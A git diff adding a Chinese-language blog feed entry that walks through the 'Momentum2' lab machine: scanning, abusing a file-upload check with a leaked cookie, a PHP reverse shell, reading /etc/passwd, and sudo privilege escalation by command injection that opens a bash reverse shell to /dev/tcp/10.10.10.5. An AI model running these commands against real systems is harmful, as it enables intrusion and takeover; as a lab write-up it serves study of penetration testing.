@@ -1222,6 +1222,111 @@ chmod 777 tar
 /usr/bin/backup
 </code></pre><p><img src="content/posts/Credit%20Card%20Scammers%20Writeup/mmm.png" alt="mmm"></p>
 <p>拿下机器</p>
+]]></content></item><item><title>Momentum2 Writeup</title><link>https://enilmalus.github.io/posts/momentum2-writeup/</link><pubDate>Fri, 16 May 2025 17:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/momentum2-writeup/</guid><description>&lt;h1 id="服务扫描"&gt;服务扫描&lt;/h1&gt;
+&lt;h2 id="使用-nmap-进行基础扫描"&gt;使用 nmap 进行基础扫描&lt;/h2&gt;
+&lt;p&gt;扫描所执行的命令，执行结果如下&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;sudo nmap -sn 10.10.10.0/24
+sudo nmap --min-rate 10000 -p- 10.10.10.31
+sudo nmap -sC -sT -sV -p22,80 10.10.10.31
+sudo nmap --script=vuln -p22,80 10.10.10.31
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="P1.png" alt="P1"&gt;&lt;/p&gt;
+&lt;h2 id="gobuster-爆破目录"&gt;gobuster 爆破目录&lt;/h2&gt;
+&lt;p&gt;在漏洞扫描中发现了许多目录，因此进行更详细的目录爆破&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;sudo gobuster dir -u http://10.10.10.31 -w /usr/share/wordlists/dirb/common.txt -x php,php.bak,jsp.zip,html
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="P2.png" alt="P2"&gt;&lt;/p&gt;
+&lt;h1 id="web-渗透"&gt;Web 渗透&lt;/h1&gt;
+&lt;h2 id="页面分析"&gt;页面分析&lt;/h2&gt;
+&lt;p&gt;这是 80端口 的页面&lt;/p&gt;
+&lt;p&gt;&lt;img src="P3.png" alt="P3"&gt;&lt;/p&gt;
+&lt;p&gt;dashborard 界面像是一个文件上次的界面，可能存在 &lt;strong&gt;文件上传&lt;/strong&gt; 漏洞&lt;/p&gt;
+&lt;p&gt;&lt;img src="P4.png" alt="P4"&gt;&lt;/p&gt;
+&lt;p&gt;ajax.bak 是备份文件，curl 下载看看&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;curl http://10.10.10.31/ajax.php.bak
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="P5.png" alt="P5"&gt;&lt;/p&gt;
+&lt;p&gt;审计源码，文件上传的时候当 &lt;strong&gt;cookie&lt;/strong&gt; 名为 &lt;strong&gt;admin&lt;/strong&gt; ， 值为**&amp;amp;G6u@B6uDXMq&amp;amp;Ms** 同时 POST 名为 &lt;strong&gt;secure&lt;/strong&gt; ，值为 &lt;strong&gt;val1d&lt;/strong&gt; 的时候可以上传 pdf、php、txt 文件，否则只能上传 txt 文件
+（注释说 cookie 末尾要加一个大写字母）&lt;/p&gt;</description><content type="html"><![CDATA[<h1 id="服务扫描">服务扫描</h1>
+<h2 id="使用-nmap-进行基础扫描">使用 nmap 进行基础扫描</h2>
+<p>扫描所执行的命令，执行结果如下</p>
+<pre tabindex="0"><code>sudo nmap -sn 10.10.10.0/24
+
+sudo nmap --min-rate 10000 -p- 10.10.10.31   
+
+sudo nmap -sC -sT -sV -p22,80 10.10.10.31 
+
+sudo nmap --script=vuln -p22,80 10.10.10.31 
+</code></pre><p><img src="P1.png" alt="P1"></p>
+<h2 id="gobuster-爆破目录">gobuster 爆破目录</h2>
+<p>在漏洞扫描中发现了许多目录，因此进行更详细的目录爆破</p>
+<pre tabindex="0"><code>sudo gobuster dir -u http://10.10.10.31 -w /usr/share/wordlists/dirb/common.txt -x php,php.bak,jsp.zip,html
+</code></pre><p><img src="P2.png" alt="P2"></p>
+<h1 id="web-渗透">Web 渗透</h1>
+<h2 id="页面分析">页面分析</h2>
+<p>这是 80端口 的页面</p>
+<p><img src="P3.png" alt="P3"></p>
+<p>dashborard 界面像是一个文件上次的界面，可能存在 <strong>文件上传</strong> 漏洞</p>
+<p><img src="P4.png" alt="P4"></p>
+<p>ajax.bak 是备份文件，curl 下载看看</p>
+<pre tabindex="0"><code>curl http://10.10.10.31/ajax.php.bak
+</code></pre><p><img src="P5.png" alt="P5"></p>
+<p>审计源码，文件上传的时候当 <strong>cookie</strong> 名为 <strong>admin</strong> ， 值为**&amp;G6u@B6uDXMq&amp;Ms** 同时 POST 名为 <strong>secure</strong> ，值为 <strong>val1d</strong> 的时候可以上传 pdf、php、txt 文件，否则只能上传 txt 文件
+（注释说 cookie 末尾要加一个大写字母）</p>
+<p>其他的都是文件目录</p>
+<p><img src="P6.png" alt="P6"></p>
+<p>打开 main.js 可以看到 js 源码</p>
+<p><img src="P7.png" alt="P7"></p>
+<p>审计源码提示我们存在 <strong>文件上传</strong> ，应该就是 dashboard 界面</p>
+<p>使用 kali 自带的 php 反弹 shell，目录在 <strong>/usr/share/webshells</strong></p>
+<p>抓包上传，添加要求的 cookie 和 POST</p>
+<p><img src="P8.png" alt="P8"></p>
+<p>因为 cookie 末尾还要加一个未知的大写字母，所以爆破一下</p>
+<p><img src="P9.png" alt="P9"></p>
+<p><img src="P10.png" alt="P10"></p>
+<p>发现为 R 是 响应 1，正确字母为 R</p>
+<p><img src="P11.png" alt="P11"></p>
+<p>加上放行</p>
+<p><img src="P12.png" alt="P12"></p>
+<p>上传成功，用更大的字典目录爆破以下查找上传到的文件夹</p>
+<pre tabindex="0"><code>sudo gobuster dir -u http://10.10.10.31 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+</code></pre><p><img src="P13.png" alt="P13"></p>
+<p><img src="P14.png" alt="P14"></p>
+<p>nc 监听启动 shell</p>
+<p><img src="P15.png" alt="P15"></p>
+<h1 id="linux-提权">Linux 提权</h1>
+<p>切换更好的 bash 交互界面</p>
+<pre tabindex="0"><code>python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;);&#39;
+</code></pre><p><img src="P16.png" alt="P16"></p>
+<p>passwd 有可读权限，查看拥有 bash 环境的用户</p>
+<pre tabindex="0"><code>ls -liah /etc/passwd
+
+cat /etc/passwd | grep &#34;/bin/bash&#34;
+</code></pre><p><img src="P17.png" alt="P17"></p>
+<pre tabindex="0"><code>cd ../../../../../home/athena
+
+ls
+
+cat user.txt
+
+cat password-reminder.txt
+</code></pre><p><img src="P18.png" alt="P18"></p>
+<p>拿到密码，切换用户，查看 sudo -l 权限</p>
+<pre tabindex="0"><code>su athena
+
+myvulnerableapp*
+
+sudo -l
+</code></pre><p><img src="P19.png" alt="P19"></p>
+<p>可以免 root 使用 python3 执行 cookie-gen.py，查看 cookie-gen.py 文件</p>
+<pre tabindex="0"><code>ls -liah /home/team-tasks/cookie-gen.py
+
+cat /home/team-tasks/cookie-gen.py
+</code></pre><p><img src="P20.png" alt="P20"></p>
+<p>审计源码 发现可以拼接字符串执行命令</p>
+<pre tabindex="0"><code>sudo python3 /home/team-tasks/cookie-gen.py
+
+aaa&amp;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.10.5/2348 0&gt;&amp;1&#39;
+bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.10.5/2348 0&gt;&amp;1&#39;
+</code></pre><p><img src="P21.png" alt="P21"></p>
+<p>拿下机器</p>
 ]]></content></item><item><title>EvilBox One Writeup</title><link>https://enilmalus.github.io/posts/evilbox-one-writeup/</link><pubDate>Sun, 11 May 2025 17:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/evilbox-one-writeup/</guid><description>&lt;blockquote&gt;
 &lt;p&gt;此文章以 kali 地址为 10.10.10.5 为示例&lt;/p&gt;
 &lt;/blockquote&gt;
